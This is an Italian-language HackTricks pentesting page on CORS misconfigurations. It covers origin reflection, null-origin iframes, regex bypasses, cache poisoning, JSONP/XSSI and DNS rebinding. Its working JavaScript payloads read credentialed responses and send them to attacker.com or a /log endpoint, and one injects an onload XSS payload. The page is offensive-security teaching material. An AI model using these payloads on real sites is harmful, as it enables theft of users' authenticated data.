# CORS - Configurazioni errate e bypass

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## Cos'√® CORS?

Lo standard Cross-Origin Resource Sharing (CORS) **consente ai server di definire chi pu√≤ accedere alle loro risorse** e **quali metodi di richiesta HTTP sono consentiti** da fonti esterne.

Una politica di **stesso dominio** impone che un **server che richiede** una risorsa e il server che **ospita la risorsa** condividano lo stesso protocollo (ad esempio, `http://`), nome di dominio (ad esempio, `internal-web.com`) e **porta** (ad esempio, 80). In base a questa politica, solo le pagine web dello stesso dominio e della stessa porta sono autorizzate ad accedere alle risorse.

L'applicazione della politica di stesso dominio nel contesto di `http://normal-website.com/example/example.html` √® illustrata come segue:

| URL accessato                             | Accesso consentito?                |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | S√¨: Schema, dominio e porta identici |
| `http://normal-website.com/example2/`     | S√¨: Schema, dominio e porta identici |
| `https://normal-website.com/example/`     | No: Schema e porta diversi          |
| `http://en.normal-website.com/example/`   | No: Dominio diverso                 |
| `http://www.normal-website.com/example/`  | No: Dominio diverso                 |
| `http://normal-website.com:8080/example/` | No: Porta diversa*                  |

*Internet Explorer non considera il numero di porta nell'applicazione della politica di stesso dominio, consentendo quindi questo accesso.

### Intestazione `Access-Control-Allow-Origin`

Questa intestazione pu√≤ consentire **origini multiple**, un valore **`null`**, o un carattere jolly **`*`**. Tuttavia, **nessun browser supporta origini multiple**, e l'uso del carattere jolly `*` √® soggetto a **limitazioni**. (Il carattere jolly deve essere usato da solo e non √® consentito usarlo insieme a `Access-Control-Allow-Credentials: true`).

Questa intestazione viene **emessa da un server** in risposta a una richiesta di risorsa tra domini avviata da un sito web, con il browser che aggiunge automaticamente un'intestazione `Origin`.

### Intestazione `Access-Control-Allow-Credentials`

Per **default**, le richieste tra domini vengono effettuate senza credenziali come cookie o l'intestazione Authorization. Tuttavia, un server tra domini pu√≤ consentire la lettura della risposta quando vengono inviate credenziali impostando l'intestazione `Access-Control-Allow-Credentials` su **`true`**.

Se impostato su `true`, il browser trasmetter√† le credenziali (cookie, intestazioni di autorizzazione o certificati client TLS).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### Richiesta di pre-volo CSRF

### Comprensione delle richieste di pre-volo nella comunicazione tra domini

Quando si avvia una richiesta tra domini in determinate condizioni, come l'utilizzo di un **metodo HTTP non standard** (qualsiasi cosa diversa da HEAD, GET, POST), l'introduzione di nuovi **header**, o l'uso di un valore speciale per l'header **Content-Type**, potrebbe essere necessaria una richiesta di pre-volo. Questa richiesta preliminare, che utilizza il metodo **`OPTIONS`**, serve per informare il server delle intenzioni della successiva richiesta tra origini diverse, inclusi i metodi HTTP e gli header che intende utilizzare.

Il protocollo **Cross-Origin Resource Sharing (CORS)** richiede questo controllo di pre-volo per determinare la fattibilit√† dell'operazione tra origini diverse verificando i metodi e gli header consentiti, nonch√© l'affidabilit√† dell'origine. Per una comprensione dettagliata delle condizioni che evitano la necessit√† di una richiesta di pre-volo, fare riferimento alla guida completa fornita da [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests).

√à importante notare che **l'assenza di una richiesta di pre-volo non esclude la necessit√† che la risposta contenga gli header di autorizzazione**. Senza questi header, il browser non √® in grado di elaborare la risposta dalla richiesta tra origini diverse.

Considera l'illustrazione seguente di una richiesta di pre-volo mirata all'utilizzo del metodo `PUT` insieme a un header personalizzato chiamato `Special-Request-Header`:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
In risposta, il server potrebbe restituire intestazioni che indicano i metodi accettati, l'origine consentita e altri dettagli sulla politica CORS, come mostrato di seguito:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
- **`Access-Control-Allow-Headers`**: Questo header specifica quali header possono essere utilizzati durante la richiesta effettiva. Viene impostato dal server per indicare gli header consentiti nelle richieste dal client.
- **`Access-Control-Expose-Headers`**: Attraverso questo header, il server informa il client su quali header possono essere esposti come parte della risposta oltre agli header di risposta semplici.
- **`Access-Control-Max-Age`**: Questo header indica per quanto tempo i risultati di una richiesta di pre-flight possono essere memorizzati nella cache. Il server imposta il tempo massimo, in secondi, che le informazioni restituite da una richiesta di pre-flight possono essere riutilizzate.
- **`Access-Control-Request-Headers`**: Utilizzato nelle richieste di pre-flight, questo header viene impostato dal client per informare il server su quali header HTTP il client desidera utilizzare nella richiesta effettiva.
- **`Access-Control-Request-Method`**: Questo header, utilizzato anche nelle richieste di pre-flight, viene impostato dal client per indicare quale metodo HTTP verr√† utilizzato nella richiesta effettiva.
- **`Origin`**: Questo header viene impostato automaticamente dal browser e indica l'origine della richiesta cross-origin. Viene utilizzato dal server per valutare se la richiesta in arrivo deve essere consentita o negata in base alla politica CORS.

Si noti che di solito (a seconda del tipo di contenuto e degli header impostati) in una richiesta **GET/POST non viene inviata una richiesta di pre-flight** (la richiesta viene inviata **direttamente**), ma se si desidera accedere agli **header/corpo della risposta**, deve contenere un header _Access-Control-Allow-Origin_ che lo consenta.\
**Pertanto, CORS non protegge contro CSRF (ma pu√≤ essere utile).**

### **Richiesta di pre-flight per reti locali**

1. **`Access-Control-Request-Local-Network`**: Questo header √® incluso nella richiesta del client per indicare che la richiesta √® rivolta a una risorsa di rete locale. Serve come marcatore per informare il server che la richiesta proviene da all'interno della rete locale.

2. **`Access-Control-Allow-Local-Network`**: In risposta, i server utilizzano questo header per comunicare che la risorsa richiesta √® consentita essere condivisa con entit√† al di fuori della rete locale. Funge da luce verde per la condivisione di risorse attraverso diverse frontiere di rete, garantendo l'accesso controllato mantenendo i protocolli di sicurezza.

Una **risposta valida che consente la richiesta di rete locale** deve avere anche nella risposta l'header `Access-Controls-Allow-Local_network: true`:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Si noti che l'indirizzo IP **0.0.0.0** di Linux funziona per **bypassare** questi requisiti per accedere a localhost poich√© quell'indirizzo IP non √® considerato "locale".

√à anche possibile **bypassare i requisiti della rete locale** se si utilizza l'**indirizzo IP pubblico di un endpoint locale** (come l'indirizzo IP pubblico del router). Perch√© in diverse occasioni, anche se si accede all'**indirizzo IP pubblico**, se √® **dalla rete locale**, l'accesso sar√† concesso.


{% endhint %}

## Configurazioni errate sfruttabili

√à stato osservato che l'impostazione di `Access-Control-Allow-Credentials` su **`true`** √® un prerequisito per la maggior parte degli **attacchi reali**. Questa impostazione consente al browser di inviare credenziali e leggere la risposta, migliorando l'efficacia dell'attacco. Senza di essa, il vantaggio di far emettere una richiesta al browser anzich√© farlo da soli diminuisce, poich√© diventa impossibile sfruttare i cookie dell'utente.

### Eccezione: sfruttare la posizione di rete come autenticazione

Esiste un'eccezione in cui la posizione di rete della vittima funge da forma di autenticazione. Ci√≤ consente all'utente di utilizzare il browser della vittima come proxy, aggirando l'autenticazione basata sull'IP per accedere alle applicazioni di intranet. Questo metodo presenta somiglianze di impatto con il DNS rebinding, ma √® pi√π semplice da sfruttare.

### Riflessione di `Origin` in `Access-Control-Allow-Origin`

Lo scenario reale in cui il valore dell'intestazione `Origin` viene riflessa in `Access-Control-Allow-Origin` √® teoricamente improbabile a causa delle restrizioni sulla combinazione di queste intestazioni. Tuttavia, gli sviluppatori che desiderano abilitare CORS per pi√π URL possono generare dinamicamente l'intestazione `Access-Control-Allow-Origin` copiando il valore dell'intestazione `Origin`. Questo approccio pu√≤ introdurre vulnerabilit√†, in particolare quando un attaccante utilizza un dominio con un nome progettato per apparire legittimo, ingannando cos√¨ la logica di convalida.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### Sfruttare l'origine `null`

L'origine `null`, specificata per situazioni come reindirizzamenti o file HTML locali, occupa una posizione unica. Alcune applicazioni includono questa origine nella whitelist per facilitare lo sviluppo locale, consentendo involontariamente a qualsiasi sito web di imitare un'origine `null` tramite un iframe sandboxed, eludendo cos√¨ le restrizioni CORS.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### Tecniche di bypass delle espressioni regolari

Quando si incontra una whitelist di domini, √® fondamentale testare le opportunit√† di bypass, come l'aggiunta del dominio dell'attaccante a un dominio in whitelist o lo sfruttamento delle vulnerabilit√† di takeover dei sottodomini. Inoltre, le espressioni regolari utilizzate per la convalida dei domini possono trascurare le sfumature delle convenzioni di denominazione dei domini, offrendo ulteriori opportunit√† di bypass.

### Bypass avanzati delle espressioni regolari

I pattern Regex si concentrano tipicamente su caratteri alfanumerici, punto (.), e trattino (-), trascurando altre possibilit√†. Ad esempio, un nome di dominio creato per includere caratteri interpretati in modo diverso dai browser e dai pattern Regex pu√≤ eludere i controlli di sicurezza. La gestione dei caratteri di sottodomini con underscore in Safari, Chrome e Firefox illustra come tali discrepanze possano essere sfruttate per aggirare la logica di convalida del dominio.

**Per ulteriori informazioni e impostazioni su questo controllo di bypass:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **e** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (153).png>)

### Da XSS all'interno di un sottodominio

Spesso gli sviluppatori implementano meccanismi di difesa per proteggersi dall'exploit di CORS, includendo in whitelist i domini autorizzati a richiedere informazioni. Nonostante queste precauzioni, la sicurezza del sistema non √® infallibile. La presenza di un singolo sottodominio vulnerabile tra i domini in whitelist pu√≤ aprire la porta all'exploit di CORS attraverso altre vulnerabilit√†, come XSS (Cross-Site Scripting).

Per illustrare, consideriamo lo scenario in cui un dominio, `requester.com`, √® in whitelist per accedere alle risorse di un altro dominio, `provider.com`. La configurazione lato server potrebbe apparire cos√¨:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
In questa configurazione, tutti i sottodomini di `requester.com` sono autorizzati ad accedere. Tuttavia, se un sottodominio, ad esempio `sub.requester.com`, viene compromesso con una vulnerabilit√† XSS, un attaccante pu√≤ sfruttare questa debolezza. Ad esempio, un attaccante con accesso a `sub.requester.com` potrebbe sfruttare la vulnerabilit√† XSS per eludere le politiche CORS e accedere in modo malevolo alle risorse su `provider.com`.


### **Avvelenamento della cache lato server**

**[Da questa ricerca](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)**

√à possibile che sfruttando l'avvelenamento della cache lato server tramite l'iniezione di intestazioni HTTP, si possa indurre una vulnerabilit√† di Cross-Site Scripting (XSS) memorizzata. Questo scenario si verifica quando un'applicazione non sanifica l'intestazione `Origin` dai caratteri illegali, creando una vulnerabilit√† particolarmente per gli utenti di Internet Explorer e Edge. Questi browser trattano `\r` (0x0d) come un terminatore di intestazione HTTP legittimo, portando a vulnerabilit√† di iniezione di intestazioni HTTP.

Considera la seguente richiesta in cui l'intestazione `Origin` viene manipolata:
```text
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer e Edge interpretano la risposta come:
```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Mentre non √® fattibile sfruttare direttamente questa vulnerabilit√† facendo inviare un'intestazione malformata da un browser web, √® possibile generare manualmente una richiesta artigianale utilizzando strumenti come Burp Suite. Questo metodo potrebbe portare alla memorizzazione della risposta nella cache lato server e alla sua involontaria servizio ad altri. Il payload artigianale mira a modificare il set di caratteri della pagina in UTF-7, una codifica dei caratteri spesso associata a vulnerabilit√† XSS a causa della sua capacit√† di codificare i caratteri in modo da poter essere eseguiti come script in determinati contesti.

Per ulteriori informazioni sulle vulnerabilit√† XSS memorizzate, consultare [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Nota**: Lo sfruttamento delle vulnerabilit√† di iniezione di intestazioni HTTP, in particolare attraverso l'avvelenamento della cache lato server, sottolinea l'importanza critica della convalida e della sanificazione di tutti gli input forniti dall'utente, inclusi gli header HTTP. Utilizzare sempre un modello di sicurezza robusto che includa la convalida dell'input per prevenire tali vulnerabilit√†.


### **Avvelenamento della cache lato client**

**[Da questa ricerca](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)**

In questo scenario, viene osservata un'istanza di una pagina web che riflette il contenuto di un'intestazione HTTP personalizzata senza una codifica corretta. In particolare, la pagina web riflette il contenuto incluso in un'intestazione `X-User-id`, che potrebbe includere JavaScript dannoso, come dimostrato dall'esempio in cui l'intestazione contiene un tag di immagine SVG progettato per eseguire codice JavaScript al caricamento.

Le politiche di Cross-Origin Resource Sharing (CORS) consentono l'invio di intestazioni personalizzate. Tuttavia, senza che la risposta venga renderizzata direttamente dal browser a causa delle restrizioni CORS, l'utilit√† di tale iniezione potrebbe sembrare limitata. Il punto critico sorge quando si considera il comportamento della cache del browser. Se l'intestazione `Vary: Origin` non √® specificata, diventa possibile che la risposta dannosa venga memorizzata nella cache del browser. Successivamente, questa risposta memorizzata potrebbe essere renderizzata direttamente durante la navigazione all'URL, bypassando la necessit√† di una renderizzazione diretta alla richiesta iniziale. Questo meccanismo migliora l'affidabilit√† dell'attacco sfruttando la memorizzazione nella cache lato client.

Per illustrare questo attacco, viene fornito un esempio di JavaScript, progettato per essere eseguito nell'ambiente di una pagina web, ad esempio attraverso un JSFiddle. Questo script esegue una semplice azione: invia una richiesta a un URL specificato con un'intestazione personalizzata contenente il JavaScript dannoso. Al completamento della richiesta con successo, tenta di navigare all'URL di destinazione, potenzialmente innescando l'esecuzione dello script iniettato se la risposta √® stata memorizzata nella cache senza una gestione corretta dell'intestazione `Vary: Origin`.

Ecco una sintesi del JavaScript utilizzato per eseguire questo attacco:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, noto anche come Cross-Site Script Inclusion, √® un tipo di vulnerabilit√† che sfrutta il fatto che la Same Origin Policy (SOP) non si applica quando si includono risorse utilizzando il tag script. Questo perch√© gli script devono poter essere inclusi da domini diversi. Questa vulnerabilit√† consente a un attaccante di accedere e leggere qualsiasi contenuto incluso utilizzando il tag script.

Questa vulnerabilit√† diventa particolarmente significativa quando si tratta di JavaScript dinamico o JSONP (JSON con Padding), specialmente quando vengono utilizzate informazioni di autorit√† ambientale come i cookie per l'autenticazione. Quando si richiede una risorsa da un host diverso, i cookie vengono inclusi, rendendoli accessibili all'attaccante.

Per comprendere meglio e mitigare questa vulnerabilit√†, √® possibile utilizzare il plugin BurpSuite disponibile su [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp). Questo plugin pu√≤ aiutare a identificare e risolvere potenziali vulnerabilit√† XSSI nelle applicazioni web.

[**Leggi di pi√π sui diversi tipi di XSSI e su come sfruttarli qui.**](xssi-cross-site-script-inclusion.md)

Prova ad aggiungere un **parametro di callback** nella richiesta. Forse la pagina √® stata preparata per inviare i dati come JSONP. In tal caso, la pagina invier√† i dati con `Content-Type: application/javascript`, che bypasser√† la politica CORS.

![](<../.gitbook/assets/image (229).png>)

### Bypass facile (inutile?)

Un modo per aggirare la restrizione `Access-Control-Allow-Origin` √® richiedere a un'applicazione web di effettuare una richiesta per conto tuo e inviare la risposta. Tuttavia, in questo scenario, le credenziali della vittima finale non verranno inviate poich√© la richiesta viene effettuata su un dominio diverso.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Questo strumento fornisce un proxy che inoltra la tua richiesta insieme alle sue intestazioni, mentre falsifica anche l'intestazione Origin per corrispondere al dominio richiesto. In questo modo si aggira efficacemente la politica CORS. Ecco un esempio di utilizzo con XMLHttpRequest:

2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Questo strumento offre un approccio alternativo al proxy delle richieste. Invece di inoltrare la tua richiesta cos√¨ com'√®, il server effettua la propria richiesta con i parametri specificati.

### Bypass Iframe + Popup

√à possibile **aggirare i controlli CORS** come `e.origin === window.origin` creando un iframe e aprendo da esso una nuova finestra. Maggiori informazioni nella pagina seguente:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS Rebinding tramite TTL

Il DNS rebinding tramite TTL √® una tecnica utilizzata per aggirare determinate misure di sicurezza manipolando i record DNS. Ecco come funziona:

1. L'attaccante crea una pagina web e fa accedere la vittima.
2. L'attaccante cambia quindi il DNS (IP) del proprio dominio in modo che punti alla pagina web della vittima.
3. Il browser della vittima memorizza nella cache la risposta DNS, che pu√≤ avere un valore TTL (Time to Live) che indica per quanto tempo il record DNS deve essere considerato valido.
4. Quando il TTL scade, il browser della vittima effettua una nuova richiesta DNS, consentendo all'attaccante di eseguire codice JavaScript sulla pagina della vittima.
5. Mantenendo il controllo sull'IP della vittima, l'attaccante pu√≤ raccogliere informazioni dalla vittima senza inviare alcun cookie al server della vittima.

√à importante notare che i browser hanno meccanismi di caching che possono impedire un abuso immediato di questa tecnica, anche con valori TTL bassi.

Il DNS rebinding pu√≤ essere utile per aggirare controlli IP espliciti eseguiti dalla vittima o per scenari in cui un utente o un bot rimane sulla stessa pagina per un periodo prolungato, consentendo la scadenza della cache.

Se hai bisogno di un modo rapido per sfruttare il DNS rebinding, puoi utilizzare servizi come [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Per eseguire il proprio server DNS rebinding, √® possibile utilizzare strumenti come **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)). Ci√≤ comporta l'esposizione della porta locale 53/udp, la creazione di un record A che punti ad essa (ad esempio, ns.example.com) e la creazione di un record NS che punti al sottodominio A creato in precedenza (ad esempio, ns.example.com). Qualsiasi sottodominio del sottodominio ns.example.com verr√† quindi risolto dal tuo host.

√à anche possibile esplorare un server in esecuzione pubblicamente su [http://rebind.it/singularity.html](http://rebind.it/singularity.html) per una maggiore comprensione e sperimentazione.

### DNS Rebinding tramite **Cache**

Un altro modo per aggirare la difesa della cache consiste nell'utilizzare pi√π indirizzi IP per lo stesso sottodominio nel provider DNS. Ecco come funziona:

1. L'attaccante configura due record A (o un singolo record A con due IP) per lo stesso sottodominio nel provider DNS.
2. Quando un browser verifica questi record, riceve entrambi gli indirizzi IP.
3. Se il browser decide di utilizzare prima l'indirizzo IP dell'attaccante, l'attaccante pu√≤ servire un payload che effettua richieste HTTP allo stesso dominio.
4. Tuttavia, una volta ottenuto l'indirizzo IP della vittima, l'attaccante smette di rispondere al browser della vittima.
5. Il browser della vittima, rendendosi conto che il dominio non risponde, passa a utilizzare il secondo indirizzo IP fornito.
6. Accedendo al secondo indirizzo IP, il browser aggira la Same Origin Policy (SOP), consentendo all'attaccante di sfruttare ci√≤ e raccogliere ed esfiltrare informazioni.

Questa tecnica sfrutta il comportamento dei browser quando vengono forniti pi√π indirizzi IP per un dominio. Controllando strategicamente le risposte e manipolando la scelta dell'indirizzo IP del browser, un attaccante pu√≤ sfruttare la SOP e accedere alle informazioni della vittima.

{% hint style="warning" %}
Nota che per accedere a localhost dovresti provare a riconfigurare **127.0.0.1** in Windows e **0.0.0.0** in Linux.\
Provider come godaddy o cloudflare non mi hanno permesso di utilizzare l'IP 0.0.0.0, ma AWS route53 mi ha permesso di creare un record A con 2 IP, uno dei quali era "0.0.0.0"

<img src="../.gitbook/assets/image (638) (2) (1) (1) (1).png" alt="" data-size="original">
{% endhint %}

Per ulteriori informazioni, puoi consultare [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)
### Altri Bypass Comuni

* Se gli **IP interni non sono consentiti**, potrebbero **aver dimenticato di vietare 0.0.0.0** (funziona su Linux e Mac)
* Se gli **IP interni non sono consentiti**, rispondi con un **CNAME** a **localhost** (funziona su Linux e Mac)
* Se gli **IP interni non sono consentiti** come risposte DNS, puoi rispondere con **CNAME a servizi interni** come www.corporate.internal.

### DNS Rebidding Weaponized

Puoi trovare ulteriori informazioni sulle tecniche di bypass precedenti e su come utilizzare lo strumento seguente nella presentazione [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) √® uno strumento per eseguire attacchi di [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding). Include i componenti necessari per ricollegare l'indirizzo IP del server di attacco al nome DNS dell'host di destinazione all'indirizzo IP della macchina di destinazione e per servire payload di attacco per sfruttare software vulnerabili sulla macchina di destinazione.

### Protezione reale contro DNS Rebinding

* Utilizzare TLS nei servizi interni
* Richiedere l'autenticazione per accedere ai dati
* Convalidare l'intestazione Host
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Proposta per inviare sempre una richiesta di pre-flight quando i server pubblici vogliono accedere a server interni

## **Strumenti**

**Fuzz possibili configurazioni errate nelle politiche CORS**

* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)

## Riferimenti
* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)


<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
